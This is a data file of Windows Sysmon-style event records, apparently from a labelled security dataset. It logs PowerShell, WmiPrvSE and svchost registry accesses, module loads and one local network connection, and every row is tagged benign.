2022-05-13T08:54:09.4360000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:09.4360000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:09.4360000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4410000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\Windows\TenantRestrictions\Payload,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\Windows\TenantRestrictions\Payload,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\Windows\TenantRestrictions\Payload,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4410000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4410000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4710000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4530000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\Software Publishing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4680000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4830000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKCR,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4880000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5080000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5080000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5080000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5080000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\Wbem,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5080000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5080000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5080000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\Wbem,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5130000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5240000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5530000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5530000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5530000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5580000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5580000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5630000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5680000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5730000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5930000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3900000Z,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,tcp,192.168.3.5,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.6380000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6430000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6480000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6530000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6580000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:10.6580000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:10.6630000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6630000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6630000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6680000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6680000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6840000Z,12,C:\Windows\system32\wbem\wmiprvse.exe,,,6656,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6840000Z,12,C:\Windows\system32\wbem\wmiprvse.exe,,,6656,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7230000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.7230000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.7380000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7430000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7430000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7480000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7480000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7530000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7530000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7530000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7580000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7580000Z,12,C:\Windows\system32\wbem\wmiprvse.exe,,,6656,HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7980000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8030000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8030000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8030000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8130000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8180000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8180000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8230000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8280000Z,18,C:\Windows\system32\wbem\wmiprvse.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8330000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8330000Z,18,C:\Windows\system32\wbem\wmiprvse.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8330000Z,18,C:\Windows\system32\wbem\wmiprvse.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:11.6530000Z,12,C:\Windows\system32\svchost.exe,,,3012,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4900000Z,22,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
